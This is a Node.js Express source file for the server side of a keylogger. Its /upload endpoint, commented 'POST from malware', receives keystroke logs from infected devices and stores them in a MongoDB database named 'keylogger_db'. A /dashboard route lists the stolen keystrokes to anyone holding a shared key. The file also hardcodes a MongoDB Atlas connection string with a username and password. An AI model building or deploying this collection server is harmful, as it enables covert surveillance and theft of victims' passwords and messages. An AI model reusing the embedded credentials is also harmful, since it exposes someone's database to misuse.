const express = require('express');
const { MongoClient } = require('mongodb');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();

// === Change this when testing done ===
const SECRET_KEY = 'test123abc';  // ← simple for now; change to strong one later

const mongoUri = 'mongodb+srv://rxmha2:mimimithila125@cluster0.c0qkq.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0';
const client = new MongoClient(mongoUri);
let db;

async function connectDb() {
  try {
    await client.connect();
    db = client.db('keylogger_db');  // create/use this DB name
    console.log('Connected to MongoDB Atlas');
  } catch (err) {
    console.error('MongoDB connection error:', err);
  }
}
connectDb();  // run on startup

// Middleware
app.use(bodyParser.json({ limit: '10mb' }));
app.use(bodyParser.urlencoded({ extended: true }));
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, '../views'));

// POST from malware
app.post('/upload', async (req, res) => {
  const authHeader = req.headers['authorization'];
  if (!authHeader || authHeader !== `Bearer ${SECRET_KEY}`) {
    return res.status(401).json({ error: 'Unauthorized' });
  }

  const { device, logs, timestamp } = req.body;

  if (!device || !logs || !timestamp) {
    return res.status(400).json({ error: 'Missing required fields' });
  }

  try {
    const result = await db.collection('keystrokes').insertOne({
      device,
      logs,
      timestamp,
      received_at: new Date().toISOString()
    });
    res.status(200).json({ success: true, id: result.insertedId });
  } catch (err) {
    console.error('Insert error:', err);
    res.status(500).json({ error: 'Database error' });
  }
});

// Dashboard
app.get('/dashboard', async (req, res) => {
  const auth = req.query.auth;
  console.log('Received auth:', auth);  // debug
  console.log('Expected key:', SECRET_KEY);  // debug

  if (auth !== SECRET_KEY) {
    return res.status(401).send('Access denied. Invalid auth key.');
  }

  try {
    const logs = await db.collection('keystrokes')
      .find({})
      .sort({ received_at: -1 })
      .toArray();

    res.render('dashboard', { logs });
  } catch (err) {
    console.error('Query error:', err);
    res.status(500).send('Database error');
  }
});

// Root
app.get('/', (req, res) => {
  res.send('Keylogger Backend running. Dashboard: /dashboard?auth=yourkey');
});

module.exports = app;
